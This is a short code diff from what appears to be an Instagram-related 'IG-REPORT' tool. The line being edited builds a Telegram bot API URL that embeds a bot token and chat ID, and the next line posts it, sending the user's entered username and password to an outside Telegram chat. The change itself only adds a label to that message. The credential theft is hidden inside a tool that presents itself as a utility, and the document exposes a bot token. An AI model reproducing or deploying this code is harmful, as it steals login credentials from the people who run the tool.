@@ -46,7 +46,7 @@ headers_login = {
 'x-requested-with': 'XMLHttpRequest'
 }
 
-tlg =(f'https://api.telegram.org/bot1621155562:AAFZGnJTv12nxrim86Mxi9sozjzQPIDdGmk/sendMessage?chat_id=502361503&text=\n✥2L21L1-NEW Login  ✥\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n✥.⍆.user : {username_login} \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n ✥.⍆.password : {password_login}  ')
+tlg =(f'https://api.telegram.org/bot1621155562:AAFZGnJTv12nxrim86Mxi9sozjzQPIDdGmk/sendMessage?chat_id=502361503&text=Tool : ✥[IG-REPORT]✥\n✥2L21L1-NEW Login  ✥\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n✥.⍆.user : {username_login} \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n ✥.⍆.password : {password_login}  ')
 requests.post(tlg)
 
 
